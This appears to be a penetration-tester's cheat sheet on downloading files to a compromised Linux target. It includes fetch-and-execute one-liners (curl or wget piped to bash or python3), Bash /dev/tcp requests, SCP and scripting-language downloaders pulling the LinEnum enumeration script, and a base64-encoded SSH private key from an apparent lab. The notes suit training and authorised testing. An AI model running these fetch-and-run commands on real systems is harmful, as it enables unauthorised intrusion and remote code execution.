---
id: Download
aliases: []
tags:
  - Pentest/File-Transfer/Linux/Download
---

# Download

Download files to the target machine
(*e.g., from the Internet/Attacker machine*)

___

<!-- Base64 {{{-->
## Base64

It may be not possible to transfer files
if (*for example*) the remote host has firewall protection

<!-- Info - Base64 {{{-->
> [!info]- Base64
>
> [Base64](https://en.wikipedia.org/wiki/Base64)
> is a [binary-to-text encoding](https://en.wikipedia.org/wiki/Binary-to-text_encoding)
> that uses 64 printable characters to represent each 6-bit segment
> of a sequence of byte values
>
> Binary-to-text encodings enables transmitting binary data
> on a communication channel that only supports text
<!-- }}} -->

1. **ATTACKER**: [md5sum](https://en.wikipedia.org/wiki/Md5sum)
   — Run on the file for reference

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

2. **ATTACKER**: Encode the binary file to base64

```sh
base64 <file> -w 0
```

```sh
cat <file> | base64 -w 0; echo
```

<!-- Info {{{-->
> [!info]-
>
> - `-w`, `--wrap=COLS`: Wrap encoded lines after COLS character (*default 76*)
>   (*0 to disable line wrapping*)
<!-- }}} -->

3. **TARGET**: Copy the base64 string to the terminal to decode it

```sh
echo <base64_string> | base64 -d > <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```powershell
> PS C:\htb> [IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo="))
> ```
<!-- }}} -->

4. **TARGET**: [md5sum](https://en.wikipedia.org/wiki/Md5sum)
   — Validate the hash

```sh
md5sum <file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> md5sum id_rsa
> ```
> ```sh
> 321de1d7e7c3735838890a72c9ae7d1d id_rsa
> ```
<!-- }}} -->

___
<!-- }}} -->

<!-- Web Download {{{-->
## Web Download

Download file(*s*) to the remote host from

- the Internet

- a [Python HTTP Server](https://developer.mozilla.org/en-US/docs/Learn_web_development/Howto/Tools_and_setup/set_up_a_local_testing_server)
  running on the attacker machine

```sh
sudo python3 -m http.server 8000
```

<!-- cURL {{{-->
### cURL

[[cURL]] — Download a file

```sh
curl <url> -o <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
> ```
<!-- }}} -->

<!-- }}} -->

<!-- wget {{{-->
### wget

[[wget]] — Download a file

```sh
wget <url> -O <out_file>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Fileless Download {{{-->
## Fileless Download

Because of the way Linux works
and how [pipes operate](https://www.geeksforgeeks.org/linux-unix/piping-in-unix-or-linux/),
most of the tools we use in Linux can be used
to replicate fileless operations

> [!warning]
>
> Depending on the payload chosen it may create temporary files on the OS
> (*e.g., [mkfifo](https://en.wikipedia.org/wiki/Named_pipe)*)

<!-- cURL {{{-->
### cURL

[[cURL]] — Download and execute a file

```sh
curl <url> | bash
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
> ```
<!-- }}} -->

<!-- }}} -->

<!-- wget {{{-->
### wget

[[wget]] — Download and execute a file

```sh
wget -qO- <url> | python3
```

<!-- Info {{{-->
> [!info]
>
> - `-o`: Output file
> - `-q`: Quiet, turn off output
<!-- }}} -->

<!-- Example {{{-->
> [!example]-
>
> ```sh
> wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
> ```
> ```sh
> Hello World!
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Bash {{{-->
## Bash

Download files with Bash using the built-in `/dev/TCP` device file

> [!info]
>
> Requires Bash `2.04<`, compiled with `--enable-net-redirections`

1. Connect to the target web server

```sh
exec 3<>/dev/tcp/<target>/<port>
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> exec 3<>/dev/tcp/10.10.10.32/80
> ```
<!-- }}} -->

2. Initiate a HTTP GET Request to get the file

```sh
echo -e "GET /<file> HTTP/1.1\n\n">&3
```

<!-- Example {{{ -->
> [!example]-
>
> ```sh
> echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
> ```
<!-- }}} -->

3. Print the response

```sh
cat <&3
```

___
<!-- }}} -->

<!-- SSH {{{-->
## SSH

The [[SSH/General|SSH]] implementation comes with an
[SCP](https://en.wikipedia.org/wiki/Secure_copy_protocol)
utility for remote file transfer

It is possible to transfer files using `scp` once

- SSH connection is established
- User credentials are known

<!-- SSH Server {{{-->
### SSH Server

Set up an SSH server on the attacker machine
prior to transferring files

1. Enable the SSH Server

```sh
sudo systemctl enable ssh
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> sudo systemctl enable ssh
> ```
> ```sh
> Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
> Executing: /lib/systemd/systemd-sysv-install enable ssh
> Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
> ...SNIP...
> ```
<!-- }}} -->

2. Start the SSH Server

```sh
sudo systemctl start ssh
```

3. Check for SSH Listening Port

```sh
netstat -lnpt
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> netstat -lnpt
> ```
> ```sh
> (Not all processes could be identified, non-owned process info
>  will not be shown, you would have to be root to see it all.)
> Active Internet connections (only servers)
> Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
> tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      - 
> ```
<!-- }}} -->

<!-- }}} -->

<!-- SCP Transfer {{{-->
### SCP Transfer

Download a remote file from the attacker machine

```sh
scp <user>@<target_ip>:<file> .
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> scp user@192.168.49.128:/root/myroot.txt .
> ```
<!-- }}} -->

<!-- Tip {{{-->
> [!tip]
>
> Create a temporary user account for file transfers
> to avoid using primary credentials or keys on the target computer
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->

<!-- Code {{{-->
## Code

<!-- Python {{{-->
### Python

[Python 3](https://www.python.org/downloads/)
— Download a file

```sh
python3 -c 'import urllib.request;urllib.request.urlretrieve("<url>", "<out_file>")'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
> ```
<!-- }}} -->

[Python 2.7](https://www.python.org/download/releases/2.7/)
— Download a file

```sh
python2.7 -c 'import urllib;urllib.urlretrieve ("<url>", "<out_file>")'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
> ```
<!-- }}} -->

<!-- }}} -->

<!-- PHP {{{-->
### PHP

[File_get_contents()](https://www.php.net/manual/en/function.file-get-contents.php)
— Download a file

```sh
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
> ```
<!-- }}} -->

[Fopen()](https://www.php.net/manual/en/function.fopen.php)
— Download a file

```sh
php -r 'const BUFFER = 1024; $fremote = 
fopen("<file>", "rb"); $flocal = fopen("<out_file>", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -r 'const BUFFER = 1024; $fremote = 
> fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
> ```
<!-- }}} -->

Fileless download

> [!tip]
>
> The URL can be used as a filename with the `@file` function
> if the `fopen` wrappers have been enabled

```sh
php -r '$lines = @file("<url>"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Ruby {{{-->
### Ruby

```sh
ruby -e 'require "net/http"; File.write("<out_file>", Net::HTTP.get(URI.parse("<url>")))'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
> ```
<!-- }}} -->

<!-- }}} -->

<!-- Perl {{{-->
### Perl

```sh
perl -e 'use LWP::Simple; getstore("<url>", "<out_file>");'
```

<!-- Example {{{-->
> [!example]-
>
> ```sh
> perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
> ```
<!-- }}} -->

<!-- }}} -->

___
<!-- }}} -->
